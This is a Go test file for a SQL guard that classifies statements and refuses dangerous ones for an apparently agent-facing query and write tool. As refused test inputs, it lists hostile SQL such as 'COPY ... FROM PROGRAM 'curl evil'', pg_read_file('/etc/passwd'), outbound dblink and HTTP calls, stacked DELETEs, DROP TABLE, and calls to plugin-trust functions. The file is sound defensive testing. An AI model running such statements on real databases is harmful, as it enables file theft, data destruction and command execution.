package sqlguard_test

import (
	"errors"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/basaltdbhq/basaltdb/internal/core/sqlguard"
)

func refusalOf(t *testing.T, err error) sqlguard.Reason {
	t.Helper()
	if err == nil {
		return ""
	}
	var r *sqlguard.RefusalError
	require.True(t, errors.As(err, &r), "error %v is not a refusal", err)
	return r.Reason
}

func TestClassify(t *testing.T) {
	t.Parallel()
	cases := []struct {
		sql     string
		kind    sqlguard.Kind
		op      sqlguard.Op
		refused sqlguard.Reason
		tables  []string
		funcs   []string
		params  int
	}{
		{
			sql:  "SELECT id, lower(name) FROM public.leads l JOIN deals d ON d.lead_id = l.id WHERE l.created_at > now() - interval '1 day'",
			kind: sqlguard.KindRead, op: sqlguard.OpRead, tables: []string{"deals", "public.leads"}, funcs: []string{"lower", "now"},
		},
		{sql: "SELECT count(id), coalesce(max(score), 0) FROM leads", kind: sqlguard.KindRead, op: sqlguard.OpRead, tables: []string{"leads"}, funcs: []string{"count", "max"}},
		{sql: "WITH recent AS (SELECT * FROM leads) SELECT * FROM recent", kind: sqlguard.KindRead, op: sqlguard.OpRead, tables: []string{"leads"}, funcs: []string{}},
		{sql: "SELECT * FROM leads WHERE id = $1 AND status = $3", kind: sqlguard.KindRead, op: sqlguard.OpRead, tables: []string{"leads"}, funcs: []string{}, params: 3},
		{sql: "SELECT pg_catalog.lower('A')", kind: sqlguard.KindRead, op: sqlguard.OpRead, tables: []string{}, funcs: []string{"pg_catalog.lower"}},
		{sql: "UPDATE cases SET status = $1 WHERE id = $2", kind: sqlguard.KindWrite, op: sqlguard.OpUpdate, tables: []string{"cases"}, funcs: []string{}, params: 2},
		{sql: "INSERT INTO leads(name) VALUES ('a') ON CONFLICT (name) DO UPDATE SET name = excluded.name", kind: sqlguard.KindWrite, op: sqlguard.OpInsert, tables: []string{"leads"}, funcs: []string{}},
		{sql: "DELETE FROM leads WHERE id IN (SELECT lead_id FROM spam) RETURNING id", kind: sqlguard.KindWrite, op: sqlguard.OpDelete, tables: []string{"leads", "spam"}, funcs: []string{}},
		{sql: "WITH s AS (SELECT id FROM spam) DELETE FROM leads WHERE id IN (SELECT id FROM s)", kind: sqlguard.KindWrite, op: sqlguard.OpDelete, tables: []string{"leads", "spam"}, funcs: []string{}},

		{sql: "SELECT 1; DELETE FROM leads", refused: sqlguard.ReasonMultipleStatements},
		{sql: "SELEC 1", refused: sqlguard.ReasonParseError},
		{sql: "", refused: sqlguard.ReasonMultipleStatements},
		{sql: "WITH d AS (DELETE FROM leads RETURNING id) SELECT count(*) FROM d", kind: sqlguard.KindRead, op: sqlguard.OpRead, refused: sqlguard.ReasonDataModifyingWith, tables: []string{"leads"}, funcs: []string{"count"}},
		{sql: "WITH d AS (DELETE FROM a RETURNING id) INSERT INTO b SELECT id FROM d", kind: sqlguard.KindWrite, op: sqlguard.OpInsert, refused: sqlguard.ReasonDataModifyingWith, tables: []string{"a", "b"}, funcs: []string{}},
		{sql: "COPY leads TO '/tmp/x'", kind: sqlguard.KindUtility, op: "CopyStmt", refused: sqlguard.ReasonUtility, tables: []string{"leads"}, funcs: []string{}},
		{sql: "COPY leads FROM PROGRAM 'curl evil'", kind: sqlguard.KindUtility, op: "CopyStmt", refused: sqlguard.ReasonUtility, tables: []string{"leads"}, funcs: []string{}},
		{sql: "DROP TABLE leads", kind: sqlguard.KindDDL, op: "DropStmt", refused: sqlguard.ReasonDDL, tables: []string{}, funcs: []string{}},
		{sql: "ALTER TABLE leads DISABLE TRIGGER ALL", kind: sqlguard.KindDDL, op: "AlterTableStmt", refused: sqlguard.ReasonDDL, tables: []string{"leads"}, funcs: []string{}},
		{sql: "TRUNCATE leads", kind: sqlguard.KindDDL, op: "TruncateStmt", refused: sqlguard.ReasonDDL, tables: []string{"leads"}, funcs: []string{}},
		{sql: "CREATE TABLE x (id int)", kind: sqlguard.KindDDL, op: "CreateStmt", refused: sqlguard.ReasonDDL, tables: []string{"x"}, funcs: []string{}},
		{sql: "GRANT SELECT ON leads TO public", kind: sqlguard.KindDDL, op: "GrantStmt", refused: sqlguard.ReasonDDL, tables: []string{"leads"}, funcs: []string{}},
		{sql: "SELECT * INTO copy_of_leads FROM leads", kind: sqlguard.KindDDL, op: sqlguard.OpRead, refused: sqlguard.ReasonSelectInto, tables: []string{"copy_of_leads", "leads"}, funcs: []string{}},
		{sql: "SELECT * FROM leads FOR UPDATE", kind: sqlguard.KindRead, op: sqlguard.OpRead, refused: sqlguard.ReasonLockingRead, tables: []string{"leads"}, funcs: []string{}},
		{sql: "SELECT pg_sleep(100)", kind: sqlguard.KindRead, op: sqlguard.OpRead, refused: sqlguard.ReasonFunction, tables: []string{}, funcs: []string{"pg_sleep"}},
		{sql: "SELECT pg_read_file('/etc/passwd')", kind: sqlguard.KindRead, op: sqlguard.OpRead, refused: sqlguard.ReasonFunction, tables: []string{}, funcs: []string{"pg_read_file"}},
		{sql: "SELECT * FROM dblink('host=x', 'select 1') AS t(a int)", kind: sqlguard.KindRead, op: sqlguard.OpRead, refused: sqlguard.ReasonFunction, tables: []string{}, funcs: []string{"dblink"}},
		{sql: "SELECT lo_import('/etc/passwd')", kind: sqlguard.KindRead, op: sqlguard.OpRead, refused: sqlguard.ReasonFunction, tables: []string{}, funcs: []string{"lo_import"}},
		{sql: "SELECT set_config('basalt.intent', 'x', false)", kind: sqlguard.KindRead, op: sqlguard.OpRead, refused: sqlguard.ReasonFunction, tables: []string{}, funcs: []string{"set_config"}},
		{sql: "SELECT nextval('leads_id_seq')", kind: sqlguard.KindRead, op: sqlguard.OpRead, refused: sqlguard.ReasonFunction, tables: []string{}, funcs: []string{"nextval"}},
		{sql: "UPDATE leads SET name = pg_catalog.pg_advisory_lock(1)::text", kind: sqlguard.KindWrite, op: sqlguard.OpUpdate, refused: sqlguard.ReasonFunction, tables: []string{"leads"}, funcs: []string{"pg_catalog.pg_advisory_lock"}},
		{sql: "SELECT net.http_post('https://x', '{}')", kind: sqlguard.KindRead, op: sqlguard.OpRead, refused: sqlguard.ReasonFunction, tables: []string{}, funcs: []string{"net.http_post"}},
		{sql: "SELECT public.lower('x')", kind: sqlguard.KindRead, op: sqlguard.OpRead, refused: sqlguard.ReasonFunction, tables: []string{}, funcs: []string{"public.lower"}},
		{sql: "SELECT * FROM leads WHERE id = (SELECT max(id) FROM leads WHERE pg_sleep(1) IS NOT NULL)", kind: sqlguard.KindRead, op: sqlguard.OpRead, refused: sqlguard.ReasonFunction, tables: []string{"leads"}, funcs: []string{"max", "pg_sleep"}},
		{sql: "SET basalt.intent = 'x'", kind: sqlguard.KindUtility, op: "VariableSetStmt", refused: sqlguard.ReasonUtility, tables: []string{}, funcs: []string{}},
		{sql: "SET session_replication_role = replica", kind: sqlguard.KindUtility, op: "VariableSetStmt", refused: sqlguard.ReasonUtility, tables: []string{}, funcs: []string{}},
		{sql: "DO $$ BEGIN DELETE FROM leads; END $$", kind: sqlguard.KindUtility, op: "DoStmt", refused: sqlguard.ReasonUtility, tables: []string{}, funcs: []string{}},
		{sql: "EXPLAIN ANALYZE DELETE FROM leads", kind: sqlguard.KindUtility, op: "ExplainStmt", refused: sqlguard.ReasonUtility, tables: []string{"leads"}, funcs: []string{}},
		{sql: "MERGE INTO leads l USING src s ON l.id = s.id WHEN MATCHED THEN DELETE", kind: sqlguard.KindWrite, op: sqlguard.OpMerge, refused: sqlguard.ReasonMerge, tables: []string{"leads", "src"}, funcs: []string{}},
		{sql: "BEGIN", kind: sqlguard.KindUtility, op: "TransactionStmt", refused: sqlguard.ReasonUtility, tables: []string{}, funcs: []string{}},
		{sql: "CALL do_things()", kind: sqlguard.KindUtility, op: "CallStmt", refused: sqlguard.ReasonUtility, tables: []string{}, funcs: []string{"do_things"}},
	}
	for _, c := range cases {
		t.Run(c.sql, func(t *testing.T) {
			t.Parallel()
			stmt, err := sqlguard.Classify(c.sql)
			require.Equal(t, c.refused, refusalOf(t, err), "err=%v", err)
			if c.refused == sqlguard.ReasonParseError || c.refused == sqlguard.ReasonMultipleStatements {
				return
			}
			require.Equal(t, c.kind, stmt.Kind)
			require.Equal(t, c.op, stmt.Op)
			require.Equal(t, c.tables, stmt.Tables)
			require.Equal(t, c.funcs, stmt.Functions)
			require.Equal(t, c.params, stmt.ParamCount)
		})
	}
}

// Target is the relation a write writes, as written; another table the
// statement names never is.
func TestTarget(t *testing.T) {
	t.Parallel()
	for sql, want := range map[string]string{
		"UPDATE payroll SET amount = 0 FROM audit_log a WHERE a.id = payroll.id":                           "payroll",
		"DELETE FROM public.leads USING archive WHERE archive.id = leads.id":                               "public.leads",
		"INSERT INTO leads (id) SELECT id FROM a_import":                                                   "leads",
		`UPDATE "Old Leads" SET id = 1`:                                                                    "Old Leads",
		"SELECT * FROM leads":                                                                              "",
		"MERGE INTO payroll p USING audit_log a ON p.id = a.id WHEN MATCHED THEN DELETE":                   "payroll",
		"WITH d AS (DELETE FROM payroll RETURNING *) INSERT INTO audit_log SELECT * FROM d":                "payroll",
		"WITH d AS (DELETE FROM payroll RETURNING *) SELECT * FROM d JOIN audit_log USING (id)":            "payroll",
		"WITH r AS (SELECT * FROM audit_log), u AS (UPDATE public.leads SET id = 1 RETURNING id) SELECT 1": "public.leads",
		"WITH r AS (SELECT * FROM audit_log) UPDATE payroll SET id = 1 FROM r":                             "payroll",
		"DROP TABLE leads": "",
	} {
		stmt, _ := sqlguard.Classify(sql)
		require.Equal(t, want, stmt.Target, sql)
	}
}

func TestCheckTool(t *testing.T) {
	t.Parallel()
	cases := []struct {
		sql     string
		tool    sqlguard.Tool
		refused sqlguard.Reason
	}{
		{"SELECT 1", sqlguard.ToolQuery, ""},
		{"VALUES (1), (2)", sqlguard.ToolQuery, ""},
		{"UPDATE leads SET a = 1", sqlguard.ToolQuery, sqlguard.ReasonWrongTool},
		{"DELETE FROM leads", sqlguard.ToolQuery, sqlguard.ReasonWrongTool},
		{"UPDATE leads SET a = 1", sqlguard.ToolWrite, ""},
		{"INSERT INTO leads(a) SELECT a FROM other", sqlguard.ToolWrite, ""},
		{"DELETE FROM leads WHERE id = $1", sqlguard.ToolWrite, ""},
		{"SELECT 1", sqlguard.ToolWrite, sqlguard.ReasonWrongTool},
		{"DROP TABLE leads", sqlguard.ToolWrite, sqlguard.ReasonDDL},
		{"SELECT pg_sleep(1)", sqlguard.ToolQuery, sqlguard.ReasonFunction},
		{"SELECT 1", "OTHER", sqlguard.ReasonWrongTool},
	}
	for _, c := range cases {
		t.Run(string(c.tool)+" "+c.sql, func(t *testing.T) {
			t.Parallel()
			_, err := sqlguard.Check(c.sql, c.tool)
			require.Equal(t, c.refused, refusalOf(t, err), "err=%v", err)
		})
	}
}

// A refusal's detail talks SQL, so a read is named by its SQL word, SELECT,
// not by Basalt's op, READ.
func TestRefusalDetailUsesTheSQLWord(t *testing.T) {
	t.Parallel()
	for _, c := range []struct {
		sql    string
		tool   sqlguard.Tool
		detail string
	}{
		{"SELECT 1", sqlguard.ToolWrite, "write runs one INSERT, UPDATE or DELETE; use query for SELECT"},
		{"DELETE FROM leads", sqlguard.ToolQuery, "query runs one SELECT; use write for DELETE"},
		{"SELECT * INTO copy_of_leads FROM leads", sqlguard.ToolQuery, "SELECT"},
		{"SELECT * FROM leads FOR UPDATE", sqlguard.ToolQuery, "SELECT"},
	} {
		t.Run(c.sql, func(t *testing.T) {
			t.Parallel()
			_, err := sqlguard.Check(c.sql, c.tool)
			var re *sqlguard.RefusalError
			require.ErrorAs(t, err, &re)
			require.Equal(t, c.detail, re.Detail)
		})
	}
}

// The guard's own functions are never callable through the SQL tools: the
// plugin event writer, which every agent role may execute, is refused by
// either tool, qualified or not, wherever it appears in the statement.
func TestGuardFunctionsAreRefused(t *testing.T) {
	t.Parallel()
	for _, c := range []struct {
		sql  string
		tool sqlguard.Tool
	}{
		{`SELECT basalt_meta.record_plugin_event('PLUGIN_TRUST_ADDED', '{"signerKeyId":"jNZPxNG5htlwfhg4ZgknAA"}')`, sqlguard.ToolQuery},
		{`SELECT record_plugin_event('PLUGIN_TRUST_ADDED', '{}')`, sqlguard.ToolQuery},
		{`SELECT id FROM leads WHERE id = (SELECT basalt_meta.record_plugin_event('PLUGIN_DISABLED', '{}'))`, sqlguard.ToolQuery},
		{`UPDATE leads SET name = basalt_meta.record_plugin_event('PLUGIN_TRUST_REMOVED', '{}')::text WHERE id = 1`, sqlguard.ToolWrite},
		{`INSERT INTO leads (name) VALUES ("basalt_meta"."record_plugin_event"('PLUGIN_ENABLED', '{}')::text)`, sqlguard.ToolWrite},
		{`SELECT * FROM basalt_meta.open_plugin_approval('{}', '{}')`, sqlguard.ToolQuery},
		{`SELECT basalt_meta.submit_plugin_approval(NULL, NULL, NULL, NULL, NULL)`, sqlguard.ToolQuery},
	} {
		_, err := sqlguard.Check(c.sql, c.tool)
		require.Equal(t, sqlguard.ReasonFunction, refusalOf(t, err), "%s: err=%v", c.sql, err)
	}
}

func TestRefusalMessage(t *testing.T) {
	t.Parallel()
	_, err := sqlguard.Check("SELECT pg_sleep(1)", sqlguard.ToolQuery)
	require.EqualError(t, err, "FUNCTION_NOT_ALLOWED: pg_sleep is not on the function allowlist")
	require.Equal(t, "LOCKING_READ", (&sqlguard.RefusalError{Reason: sqlguard.ReasonLockingRead}).Error())
}

func TestLimits(t *testing.T) {
	t.Parallel()
	l := sqlguard.DefaultLimits()
	require.NoError(t, l.Validate())
	require.Equal(t, 5*time.Second, l.StatementTimeout)

	require.Error(t, sqlguard.Limits{StatementTimeout: 0, ReadRowLimit: 10}.Validate())
	require.Error(t, sqlguard.Limits{StatementTimeout: time.Hour, ReadRowLimit: 10}.Validate())
	require.Error(t, sqlguard.Limits{StatementTimeout: time.Second, ReadRowLimit: 0}.Validate())
	require.Error(t, sqlguard.Limits{StatementTimeout: time.Second, ReadRowLimit: 1_000_000}.Validate())
}

func BenchmarkCheckSimpleUpdate(b *testing.B) {
	for b.Loop() {
		_, _ = sqlguard.Check("UPDATE cases SET status = $1 WHERE id = $2", sqlguard.ToolWrite)
	}
}
